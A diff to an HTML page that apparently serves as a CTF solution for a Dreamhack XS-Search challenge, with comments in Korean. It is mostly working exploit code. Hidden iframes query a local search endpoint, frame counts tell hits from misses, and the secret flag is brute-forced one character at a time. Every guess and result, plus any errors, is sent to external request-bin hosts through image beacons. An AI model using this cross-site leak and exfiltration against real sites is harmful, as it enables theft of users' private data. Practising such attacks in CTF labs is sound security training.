@@ -2,64 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>XS-Search Debug</title>
 </head>
 <body>
-    <h1>XS-Search Site</h1>
+    <h1>XS-Search Site (Debug Mode)</h1>
+    <script>
+        // 1. 타임아웃이 추가된 안전한 search 함수
+        async function search(query) {
+            return new Promise((resolve) => {
+                const ifr = document.createElement('iframe');
+                ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
 
-        <script>
-            async function search(query) {
-                return new Promise((resolve) => {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
+                // 로드 성공 시 판별
+                ifr.onload = () => {
+                    const found = ifr.contentWindow.length > 0;
+                    document.body.removeChild(ifr);
+                    resolve(found);
+                };
 
-                    ifr.onload = () => {
-                        const isFound = ifr.contentWindow.length > 0;
+                // 2. 500ms 동안 응답 없으면 강제 종료 (매우 중요)
+                setTimeout(() => {
+                    if (document.body.contains(ifr)) {
                         document.body.removeChild(ifr);
-                        resolve(isFound);
+                        resolve(false);
                     }
-                })
-            }
+                }, 500);
+            });
+        }
 
-            async function exploit() {
-                let chars = "abcdefghijklmnopqrstuvwxyz0123456789}"
-                let secret_length = 40;
-                let secret = "DH{";
+        async function exploit() {
+            // [확인용] 페이지 로드 즉시 신호 발송
+            new Image().src = `https://uzteakv.request.dreamhack.games?status=started`;
 
-                for (let i = 0; i < secret_length; i++) {
-                    let found = false;
+            let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+            let secret = "DH{";
 
-                    for (let c of chars) {
-                        if (await search(secret + c)) {
-                            // secret += c;
-                            // new Image().src = `https://wrisagx.request.dreamhack.games?secret=${secret}`;
-                            // console.log(`found: ${secret}`);
-                            // found = true;
+            for (let i = 0; i < 40; i++) {
+                let foundAny = false;
 
-                            // if (c === '}') return;
-                            // break;
-                            new Image().src = `https://wrisagx.request.dreamhack.games?try=${secret + c}&result=${isFound}`;
-        
-                            if (isFound) {
-                                secret += c;
-                                break;
-                            }
+                for (let c of chars) {
+                    // search의 결과를 result 변수에 명확히 받습니다.
+                    const result = await search(secret + c);
+                    
+                    // [디버깅] 매 시도마다 무조건 RequestBin으로 신호를 보냅니다.
+                    new Image().src = `https://uzteakv.request.dreamhack.games?try=${encodeURIComponent(secret + c)}&res=${result}`;
+                    console.log(`Trying: ${secret + c}, Result: ${result}`);
 
-                            console.log(`Tried: ${secret + c}, Found: ${isFound}`);
-                        }
-                    }
-
-                    if (!found) {
-                        console.error(`Character not found for position ${i}`);
+                    if (result) {
+                        secret += c;
+                        foundAny = true;
+                        if (c === '}') return;
                         break;
                     }
                 }
-            }
 
-            exploit();
+                if (!foundAny) break;
+            }
+        }
+
+        // 스크립트 실행
+        exploit().catch(err => {
+            // 에러 발생 시 콘솔에 출력
+            console.error("Exploit Error:", err);
+            new Image().src = `https://wrisagx.request.dreamhack.games?error=${encodeURIComponent(err.message)}`;
+        });
     </script>
 </body>
 </html>
